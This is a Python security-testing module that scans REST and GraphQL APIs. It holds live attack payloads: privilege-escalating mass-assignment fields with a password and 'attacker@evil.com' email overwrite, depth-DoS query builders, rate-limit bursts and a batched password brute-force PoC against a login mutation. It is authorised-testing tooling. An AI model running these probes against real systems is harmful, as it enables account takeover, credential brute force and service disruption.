#!/usr/bin/env python3
"""
Durpie v2 - API Security Testing (Phase 4)
==========================================

Security testing modules for modern API surfaces.

Phase 4 modules:
    - RESTAPIScanner   : Endpoint discovery, method testing, HPP, mass assignment,
                         rate limiting, API versioning
    - GraphQLScanner   : Full schema extraction, depth/batch attacks, field suggestion
                         brute force, per-field authorization bypass
    - WebSocketTester  : CSWSH detection, Origin validation, message injection

Usage as mitmproxy addons:
    mitmdump -s api_testing.py

Standalone:
    import asyncio
    from api_testing import RESTAPIScanner
    async def main():
        scanner = RESTAPIScanner()
        findings = await scanner.scan("https://api.target.com/v1/users/1")
    asyncio.run(main())

WARNING: Only use against systems you own or have explicit written permission to test.
"""

import re
import json
import time
import asyncio
import logging
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime

import aiohttp

logger = logging.getLogger(__name__)

try:
    from mitmproxy import http, ctx
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False

    class _DummyHTTP:
        class HTTPFlow:
            pass
    http = _DummyHTTP()
    ctx = None


# ============================================================
# SHARED DATA STRUCTURES
# ============================================================

@dataclass
class Finding:
    type: str
    severity: str
    url: str
    detail: str
    evidence: str = ""
    parameter: str = ""
    payload: str = ""
    poc: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {k: v for k, v in self.__dict__.items()}

    def __str__(self) -> str:
        parts = [f"[{self.severity}] {self.type}"]
        if self.parameter:
            parts.append(f"param={self.parameter}")
        parts.append(f"url={self.url}")
        if self.detail:
            parts.append(self.detail)
        return " | ".join(parts)


def _mlog(prefix: str, msg: str, level: str = "info"):
    if MITMPROXY_AVAILABLE and ctx:
        getattr(ctx.log, level if level != "warn" else "warn")(f"[{prefix}] {msg}")
    else:
        getattr(logger, level if level != "warn" else "warning")(f"[{prefix}] {msg}")


# ============================================================
# SHARED HTTP CLIENT
# ============================================================

class HTTPClient:
    """Async HTTP client with rate limiting and timeout support."""

    def __init__(self, timeout: int = 12, rate_limit: float = 0.15,
                 headers: Dict = None):
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.default_headers = headers or {}
        self._last = 0.0
        self._lock = asyncio.Lock()

    async def _throttle(self):
        if self.rate_limit <= 0:
            return
        async with self._lock:
            gap = time.time() - self._last
            if gap < self.rate_limit:
                await asyncio.sleep(self.rate_limit - gap)
            self._last = time.time()

    async def request(self, method: str, url: str, headers: Dict = None,
                      params: Dict = None, data=None, json_data=None,
                      timeout: int = None) -> Tuple[int, str, Dict]:
        """Returns (status_code, body, headers). On error returns (0, '', {})."""
        await self._throttle()
        merged = {**self.default_headers, **(headers or {})}
        t = timeout or self.timeout
        try:
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=conn) as s:
                async with s.request(
                    method, url, headers=merged, params=params,
                    data=data, json=json_data,
                    timeout=aiohttp.ClientTimeout(total=t),
                    allow_redirects=False,
                ) as r:
                    body = await r.text(errors="replace")
                    return r.status, body, dict(r.headers)
        except Exception:
            return 0, "", {}

    async def get(self, url, **kw):
        return await self.request("GET", url, **kw)

    async def post(self, url, **kw):
        return await self.request("POST", url, **kw)

    async def options(self, url, **kw):
        return await self.request("OPTIONS", url, **kw)


# ============================================================
# REST API SCANNER
# ============================================================

class RESTAPIScanner:
    """
    REST API Security Scanner.

    Why REST APIs need dedicated testing:
        REST APIs often implement security differently from web apps:
        object-level authorisation is checked per-endpoint (BOLA/IDOR),
        mass assignment vulnerabilities are endemic to ORMs, HTTP method
        access controls are frequently misconfigured, and rate limiting is
        often absent or easily bypassed.

    Tests:
        1. Endpoint discovery   - Wordlist-based path brute-force to find
                                  undocumented or admin endpoints.
        2. HTTP method testing  - Try every verb (GET/POST/PUT/PATCH/DELETE/
                                  OPTIONS/HEAD/TRACE) on discovered paths.
                                  Misconfigured access control often allows
                                  unexpected methods.
        3. HTTP Parameter Pollution (HPP)
                                - Submit duplicate parameters (e.g. id=1&id=2).
                                  Different parsing layers may use different values,
                                  enabling filter bypass or injection.
        4. Mass assignment      - POST extra fields (role, admin, balance) not
                                  intended by the API contract. Greedy ORMs bind
                                  all request fields to model objects.
        5. Rate limit testing   - Burst 30 requests and check for 429/throttling.
                                  Missing rate limits enable brute force and scraping.
        6. API versioning       - Try /v1/, /v2/, /api/v1/, etc.
                                  Older API versions often lack security controls
                                  added to the current version.
    """

    # Compact but broad wordlist of common REST API paths
    ENDPOINT_WORDLIST = [
        # Core resources
        "/api/users", "/api/user", "/api/me", "/api/profile", "/api/account",
        "/api/accounts", "/api/admin", "/api/admins", "/api/config",
        "/api/configuration", "/api/settings", "/api/preferences",
        "/api/orders", "/api/order", "/api/products", "/api/product",
        "/api/items", "/api/item", "/api/inventory", "/api/catalog",
        "/api/search", "/api/query", "/api/data", "/api/export",
        "/api/import", "/api/upload", "/api/download", "/api/files",
        "/api/file", "/api/documents", "/api/document", "/api/reports",
        "/api/analytics", "/api/dashboard", "/api/metrics", "/api/stats",
        "/api/logs", "/api/events", "/api/audit", "/api/history",
        # Auth endpoints
        "/api/auth", "/api/login", "/api/logout", "/api/register",
        "/api/signup", "/api/token", "/api/tokens", "/api/refresh",
        "/api/forgot-password", "/api/reset-password", "/api/verify",
        "/api/keys", "/api/apikeys", "/api/api-keys",
        # Admin / internal
        "/api/admin/users", "/api/admin/config", "/api/admin/settings",
        "/api/internal", "/api/internal/health", "/api/internal/metrics",
        "/api/debug", "/api/health", "/api/healthz", "/api/ping",
        "/api/status", "/api/version", "/api/info", "/api/docs",
        "/api/swagger", "/api/openapi", "/api/schema",
        # Common versioned paths (resolved at test time)
        "/v1/users", "/v1/admin", "/v1/me", "/v1/profile",
        "/v2/users", "/v2/admin",
        # Payments / billing
        "/api/payments", "/api/payment", "/api/billing", "/api/invoices",
        "/api/subscriptions", "/api/plans", "/api/coupons", "/api/credits",
        # Social / content
        "/api/posts", "/api/comments", "/api/messages", "/api/notifications",
        "/api/feed", "/api/timeline", "/api/friends", "/api/followers",
        "/api/following", "/api/likes", "/api/shares",
        # Misc
        "/api/webhooks", "/api/webhook", "/api/callbacks",
        "/api/integrations", "/api/plugins", "/api/extensions",
        "/api/roles", "/api/permissions", "/api/groups", "/api/teams",
    ]

    # All HTTP methods to test on each endpoint
    HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE",
                    "OPTIONS", "HEAD", "TRACE"]

    # Fields for mass assignment testing.
    # These represent common model fields that developers forget to guard.
    MASS_ASSIGNMENT_FIELDS = {
        "role": "admin",
        "roles": ["admin"],
        "admin": True,
        "is_admin": True,
        "isAdmin": True,
        "superuser": True,
        "is_superuser": True,
        "permissions": ["*"],
        "balance": 9999999,
        "credits": 9999999,
        "verified": True,
        "is_verified": True,
        "active": True,
        "is_active": True,
        "status": "active",
        "subscription": "enterprise",
        "plan": "premium",
        "tier": "enterprise",
        "approved": True,
        "banned": False,
        "password": "Injected@12345",        # overwrite someone else's password
        "email": "attacker@evil.com",         # overwrite email → account takeover
    }

    # API version prefixes to try
    VERSION_PREFIXES = [
        "/v1", "/v2", "/v3",
        "/api/v1", "/api/v2", "/api/v3",
        "/api/1.0", "/api/2.0",
    ]

    def __init__(self, client: HTTPClient = None):
        self.client = client or HTTPClient()
        self.findings: List[Finding] = []
        self._discovered: Set[str] = set()
        self._tested_methods: Set[str] = set()
        self._scan_queue: Set[str] = set()

    def _log(self, msg: str):   _mlog("REST", msg)
    def _warn(self, msg: str):  _mlog("REST", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    # ------------------------------------------------------------------
    # 1. Endpoint Discovery
    # ------------------------------------------------------------------

    async def discover_endpoints(self, base_url: str,
                                 extra_paths: List[str] = None) -> List[str]:
        """
        Brute-force API endpoint paths on the target.

        Returns list of URLs that returned a non-404 response.
        A 401/403 is still interesting — it means the endpoint EXISTS but
        requires authentication, making it a target for auth bypass testing.
        """
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = self.ENDPOINT_WORDLIST + (extra_paths or [])

        self._log(f"Discovering endpoints at {origin} ({len(paths)} paths)...")
        found = []

        tasks = [self._probe_path(origin, path) for path in paths]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for path, result in zip(paths, results):
            if isinstance(result, Exception):
                continue
            status, body, hdrs = result
            if status == 0:
                continue
            url = f"{origin}{path}"

            if status == 404:
                continue  # Genuine 404 — endpoint doesn't exist

            found.append(url)
            self._discovered.add(url)
            severity = "INFO"
            detail = f"Endpoint found: HTTP {status}"

            if status in (200, 201):
                detail += " — accessible without authentication"
                severity = "MEDIUM" if self._looks_sensitive(path) else "INFO"
            elif status in (401, 403):
                detail += " — exists but requires authentication (test for auth bypass)"
                severity = "INFO"
            elif status in (405,):
                detail += " — exists but method not allowed (try other verbs)"
                severity = "INFO"

            self._add(Finding(
                type="API Endpoint Discovered",
                severity=severity,
                url=url,
                detail=detail,
                evidence=f"HTTP {status}",
            ))

        self._log(f"Discovery complete: {len(found)} endpoints found")
        return found

    async def _probe_path(self, origin: str, path: str):
        return await self.client.get(f"{origin}{path}")

    @staticmethod
    def _looks_sensitive(path: str) -> bool:
        sensitive = ["admin", "config", "debug", "internal", "export",
                     "key", "secret", "token", "audit", "log", "user"]
        return any(s in path.lower() for s in sensitive)

    # ------------------------------------------------------------------
    # 2. HTTP Method Testing
    # ------------------------------------------------------------------

    async def test_http_methods(self, url: str,
                                expected_method: str = "GET") -> List[Finding]:
        """
        Try all HTTP verbs on a given endpoint.

        Why this matters:
            Many frameworks route by URL but fail to restrict by method.
            A read-only GET endpoint may also accept DELETE, wiping resources.
            OPTIONS responses may reveal allowed methods or CORS misconfigs.
            TRACE echoes request headers — enables XST (cross-site tracing) attacks.
        """
        findings = []
        key = f"methods:{url}"
        if key in self._tested_methods:
            return findings
        self._tested_methods.add(key)

        # Get baseline with the expected method
        baseline_status, _, _ = await self.client.request(expected_method, url)

        results = await asyncio.gather(*[
            self.client.request(m, url) for m in self.HTTP_METHODS
        ])

        for method, (status, body, hdrs) in zip(self.HTTP_METHODS, results):
            if status == 0:
                continue

            # TRACE enabled → XST risk
            if method == "TRACE" and status == 200:
                findings.append(Finding(
                    type="HTTP TRACE Enabled",
                    severity="LOW",
                    url=url,
                    detail=(
                        "HTTP TRACE method is enabled. Combined with XSS, TRACE "
                        "allows an attacker to read HttpOnly cookies via "
                        "Cross-Site Tracing (XST)."
                    ),
                    payload="TRACE",
                ))

            # Unexpected success on a normally-restricted method
            elif method not in ("GET", "HEAD", "OPTIONS", expected_method):
                if status in (200, 201, 202, 204):
                    findings.append(Finding(
                        type="Unexpected HTTP Method Allowed",
                        severity="MEDIUM",
                        url=url,
                        detail=(
                            f"HTTP {method} returned {status} on an endpoint that "
                            f"primarily accepts {expected_method}. "
                            f"Verify whether this method should be permitted."
                        ),
                        payload=method,
                        poc=(
                            f"# Test {method} on {url}:\n"
                            f"curl -X {method} {url} -v"
                        ),
                    ))

            # OPTIONS: check CORS and exposed methods
            if method == "OPTIONS" and status in (200, 204):
                allow = hdrs.get("Allow", hdrs.get("allow", ""))
                acao = hdrs.get("Access-Control-Allow-Origin", "")
                acam = hdrs.get("Access-Control-Allow-Methods", "")

                if acao == "*":
                    findings.append(Finding(
                        type="CORS Wildcard Origin",
                        severity="MEDIUM",
                        url=url,
                        detail=(
                            "Access-Control-Allow-Origin: * allows any domain to make "
                            "credentialed cross-origin requests to this endpoint. "
                            "Combine with a missing SameSite cookie or CSRF token for impact."
                        ),
                        evidence=f"Access-Control-Allow-Origin: {acao}",
                    ))

                dangerous = [m for m in ["DELETE", "PUT", "PATCH"]
                             if m in allow or m in acam]
                if dangerous:
                    findings.append(Finding(
                        type="Dangerous Methods in CORS Allow-Methods",
                        severity="LOW",
                        url=url,
                        detail=(
                            f"CORS pre-flight exposes mutating methods: {dangerous}. "
                            "Ensure these are actually needed by cross-origin callers."
                        ),
                        evidence=f"Allow: {allow} | ACAM: {acam}",
                    ))

        for f in findings:
            self._add(f)
        return findings

    # ------------------------------------------------------------------
    # 3. HTTP Parameter Pollution (HPP)
    # ------------------------------------------------------------------

    async def test_hpp(self, url: str, param: str,
                       original_value: str = "1") -> Optional[Finding]:
        """
        HTTP Parameter Pollution: submit the same parameter twice.

        Different layers of the stack parse duplicates differently:
        - PHP / Ruby: last value wins
        - Node.js / ASP.NET: first value wins
        - Java (Tomcat): comma-joined
        - WAFs: often check only the first value

        Attack: send id=1&id=999 to access resource 999 while WAF sees id=1.

        Why it matters:
            Many security controls (WAFs, input validators) read the first
            occurrence of a parameter; the backend uses the last. This split
            parsing enables filter bypass and BOLA/IDOR exploitation.
        """
        # Craft URL with duplicate param
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qsl(parsed.query)
        # Replace the target param and append a second copy with a test value
        new_qs = [(k, v) for k, v in qs if k != param]
        new_qs.append((param, original_value))
        new_qs.append((param, "HPP_TEST_999"))
        hpp_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(new_qs)
        ))

        baseline_status, baseline_body, _ = await self.client.get(url)
        hpp_status, hpp_body, _ = await self.client.get(hpp_url)

        if baseline_status == 0 or hpp_status == 0:
            return None

        # If responses differ significantly, HPP may be influencing the backend
        len_diff = abs(len(hpp_body) - len(baseline_body))
        if hpp_status != baseline_status or len_diff > 100:
            f = Finding(
                type="HTTP Parameter Pollution (HPP)",
                severity="MEDIUM",
                url=url,
                detail=(
                    f"Duplicate parameter '{param}' produces a different response: "
                    f"baseline={baseline_status}/{len(baseline_body)}B, "
                    f"HPP={hpp_status}/{len(hpp_body)}B (diff={len_diff}B). "
                    "Different parsing layers may use different duplicate values, "
                    "enabling WAF bypass or access control circumvention."
                ),
                parameter=param,
                payload=f"{param}={original_value}&{param}=HPP_TEST_999",
                poc=(
                    f"# HPP test:\n"
                    f"curl '{hpp_url}'\n"
                    f"# Compare response to:\n"
                    f"curl '{url}'"
                ),
            )
            self._add(f)
            return f
        return None

    # ------------------------------------------------------------------
    # 4. Mass Assignment
    # ------------------------------------------------------------------

    async def test_mass_assignment(self, url: str, method: str = "POST",
                                   existing_body: Dict = None) -> Optional[Finding]:
        """
        Mass assignment vulnerability testing.

        How it happens:
            ORMs like ActiveRecord, Mongoose, and Sequelize can automatically
            bind all request body fields to model attributes. If a developer
            forgets to whitelist allowed fields, an attacker can supply
            privileged fields like role=admin or balance=9999.

        Strategy:
            Take the existing request body, inject extra privilege fields,
            re-submit, and compare the response. A 200 where the server echoes
            back the injected fields (or where a subsequent GET shows the change)
            confirms mass assignment.
        """
        base_body = dict(existing_body or {"name": "test"})
        injected_body = {**base_body, **self.MASS_ASSIGNMENT_FIELDS}

        # Baseline
        b_status, b_body, _ = await self.client.request(
            method, url, json_data=base_body
        )
        # Injected
        i_status, i_body, _ = await self.client.request(
            method, url, json_data=injected_body
        )

        if b_status == 0 or i_status == 0:
            return None

        # Evidence of mass assignment: injected fields reflected back
        injected_keys = list(self.MASS_ASSIGNMENT_FIELDS.keys())
        reflected = [k for k in injected_keys
                     if k in i_body and k not in b_body]

        # Or: significant response size difference
        size_diff = abs(len(i_body) - len(b_body))

        if reflected or (i_status == b_status and size_diff > 50):
            evidence = f"Reflected fields: {reflected}" if reflected else f"Size diff: {size_diff}B"
            f = Finding(
                type="Mass Assignment Vulnerability",
                severity="HIGH",
                url=url,
                detail=(
                    f"Server accepted extra privileged fields in {method} body. "
                    f"Injected: {list(self.MASS_ASSIGNMENT_FIELDS.keys())[:6]}... "
                    f"Evidence: {evidence}"
                ),
                payload=json.dumps({k: v for k, v in self.MASS_ASSIGNMENT_FIELDS.items()
                                    if k in ["role", "admin", "balance"]}, indent=2),
                poc=(
                    f"# Mass assignment test:\n"
                    f"curl -X {method} {url} \\\n"
                    "  -H 'Content-Type: application/json' \\\n"
                    "  -d '{\"role\": \"admin\", \"admin\": true}'"
                ),
            )
            self._add(f)
            return f
        return None

    # ------------------------------------------------------------------
    # 5. Rate Limit Testing
    # ------------------------------------------------------------------

    async def test_rate_limit(self, url: str, burst: int = 30) -> Optional[Finding]:
        """
        Detect missing rate limiting by sending a rapid request burst.

        APIs without rate limiting are vulnerable to:
        - Credential brute force on login endpoints
        - OTP/2FA code brute force
        - Data enumeration / scraping
        - Resource exhaustion (DoS)

        We send `burst` requests rapidly (no throttle) and look for 429 Too Many
        Requests. If none arrive, rate limiting is absent or very permissive.
        """
        # Temporarily bypass rate limiting for this test
        old_rl = self.client.rate_limit
        self.client.rate_limit = 0

        tasks = [self.client.get(url) for _ in range(burst)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        self.client.rate_limit = old_rl

        statuses = [r[0] for r in results if isinstance(r, tuple) and r[0] != 0]
        if not statuses:
            return None

        rate_limited = sum(1 for s in statuses if s == 429)
        total = len(statuses)

        if rate_limited == 0:
            f = Finding(
                type="Missing Rate Limiting",
                severity="MEDIUM",
                url=url,
                detail=(
                    f"Sent {total} rapid requests — no 429 Too Many Requests received. "
                    f"Status distribution: {dict(zip(*zip(*[(s, statuses.count(s)) for s in set(statuses)])) if statuses else {})}. "
                    "Endpoint may be vulnerable to brute force or scraping."
                ),
                evidence=f"{total} requests, 0 rate limited",
                poc=(
                    f"# Rate limit test:\n"
                    f"for i in $(seq 1 {burst}); do\n"
                    f"  curl -s -o /dev/null -w '%{{http_code}}\\n' '{url}' &\n"
                    f"done; wait"
                ),
            )
            self._add(f)
            return f
        return None

    # ------------------------------------------------------------------
    # 6. API Version Testing
    # ------------------------------------------------------------------

    async def test_api_versions(self, url: str) -> List[Finding]:
        """
        Probe for older API versions that may lack current security controls.

        Why version testing matters:
            Companies often add security features (auth, rate limits, input
            validation) to their current API version but leave old versions
            running for backwards compatibility. /v1/ endpoints frequently
            lack the access controls added to /v2/.

        Strategy:
            Detect the current version prefix, then try alternatives.
            Compare the response — a working old version is a finding.
        """
        findings = []
        parsed = urllib.parse.urlparse(url)
        path = parsed.path

        # Detect current version in path
        version_match = re.search(r"/(v\d+|api/v\d+)/", path, re.IGNORECASE)
        current_prefix = version_match.group(1) if version_match else None

        # Try alternative version prefixes
        for prefix in self.VERSION_PREFIXES:
            ver = prefix.lstrip("/")
            if current_prefix and ver.lower() == current_prefix.lower():
                continue  # Skip the current version

            # Substitute the version prefix in the path
            if version_match:
                new_path = path.replace(version_match.group(1), ver, 1)
            else:
                new_path = f"/{ver}{path}"

            alt_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            status, body, _ = await self.client.get(alt_url)
            if status in (200, 201, 403, 401):  # Not 404 = version exists
                f = Finding(
                    type="Legacy API Version Accessible",
                    severity="MEDIUM",
                    url=alt_url,
                    detail=(
                        f"Alternative API version '{ver}' returned HTTP {status}. "
                        "Older versions may lack security controls added to current version. "
                        "Test for missing auth, BOLA, missing rate limits."
                    ),
                    evidence=f"HTTP {status} on {alt_url}",
                    poc=(
                        f"# Legacy version access:\n"
                        f"curl -v '{alt_url}'\n"
                        f"# Compare to current: '{url}'"
                    ),
                )
                findings.append(f)
                self._add(f)

        return findings

    # ------------------------------------------------------------------
    # Main scan entry point
    # ------------------------------------------------------------------

    async def scan(self, url: str, method: str = "GET",
                   body: Dict = None, headers: Dict = None) -> List[Finding]:
        """
        Run all REST API tests against a URL.

        Args:
            url: Full URL to test.
            method: Primary HTTP method used by the endpoint.
            body: Request body (for POST/PUT).
            headers: Request headers (auth cookies etc.).

        Returns:
            List of Finding objects.
        """
        if headers:
            self.client.default_headers.update(headers)

        findings = []
        self._log(f"Scanning {url}")

        # Endpoint discovery from the base URL
        disc = await self.discover_endpoints(url)
        findings.extend(self.findings[-len(disc):] if disc else [])

        # Test the provided URL itself
        findings += await self.test_http_methods(url, expected_method=method)
        findings += await self.test_api_versions(url)

        # HPP on each query parameter
        parsed = urllib.parse.urlparse(url)
        for param, value in urllib.parse.parse_qsl(parsed.query):
            r = await self.test_hpp(url, param, value)
            if r:
                findings.append(r)

        # Mass assignment (if POST/PUT)
        if method in ("POST", "PUT", "PATCH"):
            r = await self.test_mass_assignment(url, method, body)
            if r:
                findings.append(r)

        # Rate limit
        r = await self.test_rate_limit(url)
        if r:
            findings.append(r)

        return findings

    # ---- mitmproxy addon hooks ----

    def response(self, flow: "http.HTTPFlow"):
        if not flow.response:
            return
        ct = flow.response.headers.get("content-type", "")
        if "json" not in ct:
            return
        url = flow.request.pretty_url
        if url in self._scan_queue:
            return
        self._scan_queue.add(url)
        hdrs = dict(flow.request.headers)
        body_text = flow.request.get_text()
        try:
            body = json.loads(body_text) if body_text else None
        except json.JSONDecodeError:
            body = None
        asyncio.ensure_future(self.scan(
            url, flow.request.method, body, hdrs
        ))


# ============================================================
# GRAPHQL SCANNER
# ============================================================

class GraphQLScanner:
    """
    Enhanced GraphQL Security Scanner.

    GraphQL-specific risks:
        - Introspection reveals the full schema to attackers, enabling
          targeted queries against hidden or sensitive types/fields.
        - No built-in depth limiting → deeply nested queries trigger
          exponential resolver calls (DoS).
        - Batching lets a single request contain hundreds of queries,
          multiplying brute-force effectiveness.
        - Field-level authorization is easy to miss; resolvers that
          return data without checking auth are exploitable directly.
        - Error messages often contain stack traces or SQL queries.

    Tests:
        1. Introspection + schema extraction
        2. Query depth DoS attack
        3. Query batching (array format)
        4. Alias-based batching (single object, many aliases)
        5. Field suggestion brute force ("Did you mean...?")
        6. Per-field authorization bypass (sensitive fields without token)
        7. Query complexity / cost estimation absence
    """

    # Full introspection query for schema extraction
    FULL_INTROSPECTION = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args { ...InputValue }
        }
      }
    }
    fragment FullType on __Type {
      kind name description
      fields(includeDeprecated: true) {
        name description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated deprecationReason
      }
      inputFields { ...InputValue }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) { name }
      possibleTypes { ...TypeRef }
    }
    fragment InputValue on __InputValue {
      name description
      type { ...TypeRef }
      defaultValue
    }
    fragment TypeRef on __Type {
      kind name
      ofType { kind name ofType { kind name ofType {
        kind name ofType { kind name ofType { kind name
        ofType { kind name ofType { kind name } } } } } } }
    }
    """

    # Minimal introspection to check if it's enabled without full exposure
    PROBE_INTROSPECTION = '{ __schema { queryType { name } } }'

    # Sensitive field names to probe (field suggestion + auth bypass)
    SENSITIVE_FIELDS = [
        "password", "passwordHash", "hashedPassword", "passwordDigest",
        "secret", "secretKey", "apiKey", "api_key", "token", "accessToken",
        "refreshToken", "privateKey", "signingKey", "encryptionKey",
        "ssn", "socialSecurityNumber", "creditCard", "cardNumber",
        "cvv", "bankAccount", "routingNumber",
        "internalId", "deletedAt", "isDeleted", "isAdmin",
        "role", "permissions", "twoFactorSecret", "backupCodes",
        "stripeCustomerId", "stripePaymentMethod",
    ]

    def __init__(self, client: HTTPClient = None):
        self.client = client or HTTPClient()
        self.findings: List[Finding] = []
        self._gql_endpoints: Set[str] = set()
        self._schemas: Dict[str, Dict] = {}
        self._tested: Set[str] = set()

    def _log(self, msg: str):  _mlog("GraphQL", msg)
    def _warn(self, msg: str): _mlog("GraphQL", msg, "warn")

    @staticmethod
    def _has_introspection(data: dict) -> bool:
        """Return True if the parsed JSON response contains __schema data."""
        if not isinstance(data, dict):
            return False
        if "__schema" in data:
            return True
        nested = data.get("data")
        return isinstance(nested, dict) and "__schema" in nested

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    async def _gql_post(self, url: str, query: str,
                        variables: Dict = None,
                        headers: Dict = None) -> Tuple[int, Dict]:
        """Send a GraphQL query and return (status, parsed_json)."""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        status, body, _ = await self.client.post(
            url, json_data=payload,
            headers={"Content-Type": "application/json", **(headers or {})}
        )
        try:
            return status, json.loads(body)
        except json.JSONDecodeError:
            return status, {}

    # ------------------------------------------------------------------
    # 1. Introspection + Schema Extraction
    # ------------------------------------------------------------------

    async def test_introspection(self, url: str) -> Optional[Finding]:
        """
        Check if GraphQL introspection is enabled and extract the schema.

        Introspection should be disabled in production. It gives attackers
        a complete map of every type, field, mutation, and argument — exactly
        the information needed to craft targeted queries.

        The extracted schema is cached for use in subsequent tests.
        """
        status, data = await self._gql_post(url, self.PROBE_INTROSPECTION)
        if status == 0:
            return None

        schema_data = data.get("data", data)
        if "__schema" not in schema_data:
            return None  # Introspection disabled — good

        self._log(f"Introspection enabled at {url}, extracting full schema...")

        # Extract full schema
        _, full_data = await self._gql_post(url, self.FULL_INTROSPECTION)
        schema = (full_data.get("data") or full_data).get("__schema", {})
        if schema:
            self._schemas[url] = schema
            type_names = [t["name"] for t in schema.get("types", [])
                          if not t["name"].startswith("__")]
            self._log(f"Extracted schema: {len(type_names)} types")
        else:
            type_names = []

        f = Finding(
            type="GraphQL Introspection Enabled",
            severity="MEDIUM",
            url=url,
            detail=(
                f"GraphQL introspection is enabled. Full schema extracted: "
                f"{len(type_names)} types ({', '.join(type_names[:8])}{'...' if len(type_names) > 8 else ''}). "
                "Disable introspection in production to prevent schema disclosure."
            ),
            evidence=f"{len(type_names)} types extracted",
            poc=(
                "# Extract full schema:\n"
                f"curl -X POST {url} \\\n"
                "  -H 'Content-Type: application/json' \\\n"
                "  -d '{\"query\": \"{ __schema { types { name fields { name } } } }\"}'"
            ),
        )
        self._add(f)
        return f

    # ------------------------------------------------------------------
    # 2. Query Depth DoS
    # ------------------------------------------------------------------

    def _build_depth_query(self, depth: int, field_chain: List[str]) -> str:
        """
        Build a deeply nested GraphQL query.

        Cycles through a list of field names to build:
        { field0 { field1 { field2 { ... } } } }

        Without depth limiting, each nesting level triggers additional
        resolver calls, potentially creating O(n^depth) database queries.
        """
        if not field_chain:
            field_chain = ["user", "friends", "posts", "comments",
                           "author", "likes", "followers", "following"]
        query = ""
        for i in range(depth):
            query += "{ " + field_chain[i % len(field_chain)] + " "
        query += "{ id name } "
        query += "} " * depth
        return f"query DepthAttack {query}"

    async def test_depth_attack(self, url: str, max_depth: int = 15) -> Optional[Finding]:
        """
        Test for query depth limiting.

        A server without depth limits will attempt to resolve arbitrarily
        nested queries, exhausting database connections and CPU.

        We try increasing depths until either:
        - The server returns a depth limit error
        - We hit max_depth with a success response (vulnerability confirmed)
        """
        schema = self._schemas.get(url, {})
        # Try to find real field names from schema for a more realistic attack
        field_chain = []
        for t in schema.get("types", []):
            if t.get("fields"):
                for f in t["fields"][:2]:
                    field_chain.append(f["name"])
                if len(field_chain) >= 6:
                    break

        for depth in [5, 10, max_depth]:
            query = self._build_depth_query(depth, field_chain)
            status, data = await self._gql_post(url, query)

            if status == 0:
                continue

            errors = data.get("errors", [])
            error_text = " ".join(str(e) for e in errors).lower()

            if any(kw in error_text for kw in ["depth", "complexity", "too deep",
                                                "maximum", "limit exceeded"]):
                self._log(f"Depth limiting detected at depth {depth}")
                return None  # Server has depth protection

            if status == 200 and not errors:
                f = Finding(
                    type="GraphQL Missing Query Depth Limit",
                    severity="HIGH",
                    url=url,
                    detail=(
                        f"Query with depth={depth} returned HTTP 200 with no errors. "
                        "Without depth limiting, deeply nested queries cause exponential "
                        "resolver execution, enabling GraphQL DoS attacks."
                    ),
                    payload=query[:200] + "...",
                    poc=(
                        "# Depth attack PoC:\n"
                        f"# Depth {depth} query accepted without error\n"
                        f"curl -X POST {url} \\\n"
                        "  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"query\": \"{query[:120]}...\"}}'"
                    ),
                )
                self._add(f)
                return f

        return None

    # ------------------------------------------------------------------
    # 3. Batch Query Attack
    # ------------------------------------------------------------------

    async def test_batch_attack(self, url: str, batch_size: int = 50) -> Optional[Finding]:
        """
        Test for query batching without rate limiting.

        GraphQL supports two batching mechanisms:
        a) Array batching: POST [{query: "..."}, {query: "..."}, ...]
        b) Alias batching: { a1: login(user:"x", pass:"a") { token }
                            a2: login(user:"x", pass:"b") { token } ... }

        Without per-query rate limiting, batch requests let an attacker
        send 50+ credential guesses in a single HTTP request, completely
        defeating rate-limiting that counts HTTP requests.
        """
        simple_query = "{ __typename }"

        # Test array batching
        batch = [{"query": simple_query} for _ in range(batch_size)]
        status, body_text, _ = await self.client.post(
            url,
            json_data=batch,
            headers={"Content-Type": "application/json"}
        )

        if status == 0:
            return None

        # Parse response — array of results means batching works
        try:
            resp = json.loads(body_text) if isinstance(body_text, str) else body_text
        except Exception:
            resp = None

        array_batching = isinstance(resp, list) and len(resp) > 1

        # Test alias batching (single object with many aliases)
        aliases = "\n".join(
            f"  q{i}: __typename" for i in range(min(batch_size, 20))
        )
        alias_query = f"{{ {aliases} }}"
        a_status, a_data = await self._gql_post(url, alias_query)
        alias_batching = a_status == 200 and not a_data.get("errors")

        if array_batching or alias_batching:
            modes = []
            if array_batching:
                modes.append("array batching")
            if alias_batching:
                modes.append("alias batching")

            f = Finding(
                type="GraphQL Batch Query Attack",
                severity="HIGH",
                url=url,
                detail=(
                    f"GraphQL supports {' and '.join(modes)} without apparent rate limiting. "
                    f"A single HTTP request can contain {batch_size}+ queries, "
                    "bypassing HTTP-level rate limits on brute force attacks "
                    "(credential stuffing, OTP brute force via mutations)."
                ),
                evidence=f"batch_size={batch_size}, modes={modes}",
                poc=(
                    "# Array batch brute-force example (login mutation):\n"
                    "import json, requests\n"
                    "passwords = ['pass1', 'pass2', ...]\n"
                    "batch = [{\"query\": f'mutation {{ login(username:\"admin\" password:\"{p}\") {{ token }} }}'} \n"
                    "         for p in passwords]\n"
                    f"r = requests.post('{url}', json=batch)\n"
                    "# Look for non-null token in responses"
                ),
            )
            self._add(f)
            return f

        return None

